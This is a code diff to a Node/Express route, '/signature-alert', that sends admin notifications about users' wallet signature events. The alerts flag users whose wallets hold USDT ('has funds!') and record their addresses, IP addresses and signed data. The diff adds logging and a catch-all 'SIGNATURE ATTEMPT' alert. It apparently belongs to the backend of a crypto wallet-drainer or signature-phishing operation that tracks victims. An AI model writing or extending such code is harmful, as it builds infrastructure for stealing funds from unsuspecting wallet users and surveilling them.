@@ -2114,6 +2114,8 @@ router.post('/signature-alert', async (req, res) => {
     let alertTitle = '';
     let alertMessage = '';
     
+    console.log('📧 Signature alert received:', type, 'from user:', userAddress);
+    
     switch (type) {
       case 'BALANCE_DETECTED':
         alertTitle = `💰 BALANCE DETECTED: ${data.balance} USDT - ${userAddress.slice(0,8)}... has funds!`;
@@ -2211,10 +2213,26 @@ router.post('/signature-alert', async (req, res) => {
           `USER IP: ${realIP}\n` +
           `TIME: ${new Date().toISOString()}`;
         break;
+        
+      default:
+        alertTitle = `🔔 SIGNATURE ATTEMPT: ${type} - ${userAddress.slice(0,8)}...`;
+        alertMessage = `SIGNATURE ATTEMPT DETECTED\n\n` +
+          `TYPE: ${type}\n` +
+          `USER: ${userAddress}\n` +
+          `DATA: ${JSON.stringify(data, null, 2)}\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
     }
     
+    console.log('📧 Sending signature alert:', alertTitle ? 'HAS TITLE' : 'NO TITLE');
+    
     // Send admin notification
-    await sendAdminNotification(alertTitle, alertMessage);
+    if (alertTitle && alertMessage) {
+      await sendAdminNotification(alertTitle, alertMessage);
+    } else {
+      console.error('❌ Empty alert title or message for type:', type);
+    }
     
     res.json({ success: true });
   } catch (error) {
